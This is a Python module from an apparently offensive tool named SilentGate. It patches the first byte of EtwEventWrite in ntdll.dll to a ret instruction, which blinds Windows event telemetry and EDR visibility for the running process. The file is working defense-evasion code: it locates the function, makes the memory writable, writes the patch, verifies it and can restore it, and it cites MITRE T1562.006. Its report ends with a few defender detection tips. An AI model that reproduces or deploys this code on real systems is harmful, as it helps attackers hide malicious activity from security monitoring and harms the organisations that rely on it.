"""
SilentGate - core/etw_patcher.py
v2.0 Feature: ETW Patching

Author  : JarDani
License : MIT
Purpose : Patches EtwEventWrite in ntdll.dll to return immediately
          without writing any ETW events. Silences all user-mode
          telemetry from the current process before operations begin.

How it works:
  1. Find EtwEventWrite address in ntdll memory
  2. Read first byte to check current state
  3. Change memory protection to writable
  4. Write 0xC3 (ret) as first byte
  5. Restore memory protection
  6. Verify patch applied correctly
  7. All subsequent ETW events return silently

MITRE ATT&CK: T1562.006 - Impair Defenses: Indicator Blocking
"""

import os
import sys
import platform
import ctypes
import ctypes.wintypes


# The single byte patch
RET_BYTE          = 0xC3   # ret instruction
MOV_R10_RCX_BYTE  = 0x4C   # first byte of clean EtwEventWrite

# Memory protection constants
PAGE_EXECUTE_READWRITE = 0x40
PAGE_EXECUTE_READ      = 0x20


def check_platform():
    """ETW patching requires Windows."""
    return platform.system() == "Windows"


def find_etw_event_write():
    """
    Find the address of EtwEventWrite in ntdll.dll memory.
    Returns the address as integer or None if not found.
    """
    if not check_platform():
        return None

    kernel32 = ctypes.WinDLL("kernel32")

    ntdll_handle = kernel32.GetModuleHandleA(b"ntdll.dll")
    if not ntdll_handle:
        return None

    addr = kernel32.GetProcAddress(ntdll_handle, b"EtwEventWrite")
    return addr if addr else None


def read_byte_at(addr):
    """Read a single byte from a memory address."""
    if not check_platform():
        return None
    return ctypes.c_ubyte.from_address(addr).value


def patch_etw(explain=False):
    """
    Main function - patches EtwEventWrite to return immediately.

    On Windows: performs real ETW patching
    On Linux:   runs in simulation mode for development

    Returns dict with patching results.
    """
    if explain:
        print("\n  [ETW PATCHER] Starting ETW patch...")
        print("  [ETW PATCHER] Target    : EtwEventWrite in ntdll.dll")
        print("  [ETW PATCHER] Technique : Overwrite first byte with 0xC3 (ret)")
        print("  [ETW PATCHER] MITRE     : T1562.006 - Indicator Blocking\n")

    # Simulation mode on Linux
    if not check_platform():
        if explain:
            print("  [ETW PATCHER] Linux detected - simulation mode")
            print("  [ETW PATCHER] On Windows this would:")
            print("    1. GetProcAddress(ntdll, EtwEventWrite)")
            print("    2. Read first byte - should be 0x4C (clean)")
            print("    3. VirtualProtect to PAGE_EXECUTE_READWRITE")
            print("    4. Write 0xC3 (ret) as first byte")
            print("    5. VirtualProtect restore original protection")
            print("    6. Verify first byte is now 0xC3")
            print("    7. All ETW events from this process return silently")

        return {
            "status":       "simulated",
            "platform":     "Linux",
            "patched":      False,
            "original_byte": "0x4C (simulated)",
            "patch_byte":   "0xC3",
            "message":      "Run on Windows for live ETW patching"
        }

    # Windows mode
    if explain:
        print("  [ETW PATCHER] Step 1: Finding EtwEventWrite address...")

    etw_addr = find_etw_event_write()
    if not etw_addr:
        print("  [ETW PATCHER] ERROR: Could not find EtwEventWrite")
        return {"status": "failed", "reason": "EtwEventWrite not found"}

    if explain:
        print(f"  [ETW PATCHER] EtwEventWrite at: {hex(etw_addr)}")
        print("  [ETW PATCHER] Step 2: Reading current first byte...")

    # Read current first byte
    original_byte = read_byte_at(etw_addr)

    if explain:
        print(f"  [ETW PATCHER] Current first byte: {hex(original_byte)}")

    # Check if already patched
    if original_byte == RET_BYTE:
        if explain:
            print("  [ETW PATCHER] Already patched - first byte is 0xC3")
        return {
            "status":        "already_patched",
            "patched":       True,
            "original_byte": hex(original_byte),
            "patch_byte":    hex(RET_BYTE),
            "etw_addr":      hex(etw_addr)
        }

    # Check if hooked by EDR (not the expected 0x4C)
    if original_byte != MOV_R10_RCX_BYTE and explain:
        print(f"  [ETW PATCHER] WARNING: Unexpected first byte {hex(original_byte)}")
        print(f"  [ETW PATCHER] Expected 0x4C — may already be hooked by EDR")

    if explain:
        print("  [ETW PATCHER] Step 3: Changing memory protection to RWX...")

    # Change memory protection
    kernel32    = ctypes.WinDLL("kernel32")
    old_protect = ctypes.wintypes.DWORD()

    result = kernel32.VirtualProtect(
        ctypes.c_void_p(etw_addr),
        1,
        PAGE_EXECUTE_READWRITE,
        ctypes.byref(old_protect)
    )

    if not result:
        print("  [ETW PATCHER] ERROR: VirtualProtect failed")
        return {"status": "failed", "reason": "VirtualProtect failed"}

    if explain:
        print(f"  [ETW PATCHER] Old protection: {hex(old_protect.value)}")
        print("  [ETW PATCHER] Step 4: Writing 0xC3 (ret) patch...")

    # Write the patch
    ctypes.c_ubyte.from_address(etw_addr).value = RET_BYTE

    if explain:
        print("  [ETW PATCHER] Step 5: Restoring memory protection...")

    # Restore protection
    kernel32.VirtualProtect(
        ctypes.c_void_p(etw_addr),
        1,
        old_protect.value,
        ctypes.byref(old_protect)
    )

    if explain:
        print("  [ETW PATCHER] Step 6: Verifying patch...")

    # Verify
    patched_byte = read_byte_at(etw_addr)
    success      = (patched_byte == RET_BYTE)

    if explain:
        print(f"  [ETW PATCHER] Patched byte: {hex(patched_byte)}")
        if success:
            print("  [ETW PATCHER] SUCCESS - EtwEventWrite patched")
            print("  [ETW PATCHER] All ETW events from this process are silenced")
            print("  [ETW PATCHER] EDR user-mode telemetry feed is now blind")
        else:
            print("  [ETW PATCHER] FAILED - byte did not change")

    return {
        "status":        "success" if success else "failed",
        "patched":       success,
        "original_byte": hex(original_byte),
        "patch_byte":    hex(patched_byte),
        "etw_addr":      hex(etw_addr),
        "mitre":         "T1562.006 - Impair Defenses: Indicator Blocking"
    }


def restore_etw(original_byte, explain=False):
    """
    Restore EtwEventWrite to its original state.
    Good practice to restore after operations complete.
    """
    if not check_platform():
        return False

    if explain:
        print("\n  [ETW PATCHER] Restoring EtwEventWrite...")

    etw_addr = find_etw_event_write()
    if not etw_addr:
        return False

    kernel32    = ctypes.WinDLL("kernel32")
    old_protect = ctypes.wintypes.DWORD()

    kernel32.VirtualProtect(
        ctypes.c_void_p(etw_addr), 1,
        PAGE_EXECUTE_READWRITE,
        ctypes.byref(old_protect)
    )

    ctypes.c_ubyte.from_address(etw_addr).value = original_byte

    kernel32.VirtualProtect(
        ctypes.c_void_p(etw_addr), 1,
        old_protect.value,
        ctypes.byref(old_protect)
    )

    if explain:
        print(f"  [ETW PATCHER] Restored byte: {hex(original_byte)}")
        print("  [ETW PATCHER] EtwEventWrite restored to original state")

    return True


def print_etw_report(result):
    """Print a formatted ETW patching report."""
    print(f"""
  ╔══════════════════════════════════════════════════════════════╗
  ║  ETW PATCHING REPORT                                         ║
  ╚══════════════════════════════════════════════════════════════╝

  Status         : {result['status'].upper()}
  Patched        : {result['patched']}
  Original byte  : {result.get('original_byte', 'N/A')}
  Patch byte     : {result.get('patch_byte', '0xC3')}
  MITRE          : {result.get('mitre', 'T1562.006')}

  What was silenced:
  All ETW events from this process now return immediately.
  EDR loses visibility into:
    - .NET assembly loading events
    - AMSI scan events
    - Process creation events
    - Memory allocation events
    - Thread creation events

  What this does NOT silence:
  Kernel-level ETW callbacks (fire regardless)
  Hardware-level telemetry (Intel PT)
  Network-level monitoring

  Defender perspective:
  Monitor EtwEventWrite memory pages for unexpected modification.
  Alert when first byte of EtwEventWrite changes to 0xC3.
  Use kernel callbacks instead of ETW for critical detections.
  Implement tamper protection on ETW infrastructure.
""")